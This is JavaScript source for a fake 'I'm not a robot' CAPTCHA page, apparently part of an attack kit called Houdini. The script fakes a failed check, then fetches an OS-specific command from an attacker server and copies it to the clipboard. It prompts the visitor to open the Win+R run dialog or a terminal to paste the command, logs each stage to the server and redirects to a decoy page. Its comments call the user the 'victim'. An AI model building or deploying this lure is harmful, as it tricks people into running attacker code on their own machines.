(function() {
    const TOKEN = window.__HOUDINI_TOKEN__;
    const OS = window.__HOUDINI_OS__;
    const SERVER = window.__HOUDINI_SERVER__;

    const box = document.getElementById('captcha-box');
    const checkbox = document.getElementById('checkbox');
    const text = document.getElementById('captcha-text');
    const spinner = document.getElementById('spinner');
    const errorMsg = document.getElementById('error-msg');
    const instructions = document.getElementById('instructions');
    const payloadPreview = document.getElementById('payload-preview');
    const runKeys = document.getElementById('run-keys');
    const copyHint = payloadPreview.querySelector('.copy-hint');

    let stage = 0;
    let payloadText = '';

    const botCheck = window.HoudiniBotCheck();
    if (botCheck.detected) {
        beacon('bot_detected', botCheck.details);
    }

    function beacon(stageName, meta = {}) {
        fetch(`${SERVER}/api/beacon`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: TOKEN, stage: stageName, meta})
        }).catch(() => {});
    }

    const runInstructions = {
        win: {keys: 'Win + R', action: 'Run dialog'},
        mac: {keys: '⌘ + Space, type "terminal", Enter', action: 'Terminal'},
        linux: {keys: 'Ctrl + Alt + T', action: 'Terminal'}
    };

    const osKey = OS.includes('Mac') ? 'mac' : OS.includes('Linux') ? 'linux' : 'win';
    const osInfo = runInstructions[osKey];

    beacon('viewed', {os: osKey, botScore: botCheck.score});

    box.addEventListener('click', async function() {
        if (stage === 2) return;

        if (stage === 0) {
            stage = 1;
            box.classList.add('shake');
            checkbox.style.display = 'none';
            spinner.style.display = 'block';
            text.textContent = 'Verifying...';

            setTimeout(() => {
                box.classList.remove('shake');
                spinner.style.display = 'none';
                checkbox.style.display = 'flex';
                text.textContent = "I'm not a robot";
                errorMsg.classList.add('show');
                errorMsg.textContent = 'Verification failed. Please try again.';
                beacon('check_failed');
                box.style.pointerEvents = 'auto';
            }, 800);

            box.style.pointerEvents = 'none';
            return;
        }

        if (stage === 1) {
            stage = 2;
            box.style.pointerEvents = 'none';
            checkbox.style.display = 'none';
            spinner.style.display = 'block';
            text.textContent = 'Verifying...';
            errorMsg.classList.remove('show');

            setTimeout(async () => {
                spinner.style.display = 'none';
                checkbox.style.display = 'flex';
                checkbox.classList.add('checked');
                checkbox.innerHTML = `<svg class="checkmark" viewBox="0 0 52 52"><path d="M14 27 L22 35 L38 16"/></svg>`;
                text.textContent = 'Verification successful';
                text.style.color = '#059669';

                beacon('check_passed');

                try {
                    const res = await fetch(`${SERVER}/api/payload?token=${TOKEN}&os=${osKey}`);
                    const data = await res.json();
                    payloadText = data.payload;

                    instructions.classList.add('show');
                    runKeys.textContent = osInfo.keys;
                    payloadPreview.textContent = payloadText;

                    // Copy with explicit failure handling — previously a silent
                    // clipboard failure meant the victim copied nothing but the
                    // prestige redirect still fired.
                    let copySuccess = false;
                    await window.HoudiniClipboard.copy(
                        payloadText,
                        () => { copySuccess = true; },
                        () => {
                            copySuccess = false;
                            // Guide manual copy: highlight the payload so
                            // Ctrl+C / right-click-copy grabs it
                            const range = document.createRange();
                            range.selectNodeContents(payloadPreview);
                            const sel = window.getSelection();
                            sel.removeAllRanges();
                            sel.addRange(range);
                            if (copyHint) copyHint.textContent = 'Copy the highlighted command';
                        }
                    );
                    beacon('copied', {method: copySuccess ? 'auto' : 'manual'});

                    window.HoudiniClipboard.bindReCopy(document.body, payloadText);

                    // Hold the prestige redirect longer if the copy failed so the
                    // victim has time to copy manually
                    const delay = copySuccess
                        ? (data.prestigeDelay || 5000)
                        : Math.max(data.prestigeDelay || 5000, 15000);
                    setTimeout(() => {
                        window.location.href = data.prestige || 'https://www.google.com';
                    }, delay);

                } catch(e) {
                    text.textContent = 'Error. Refresh page.';
                }
            }, 1200);
        }
    });
})();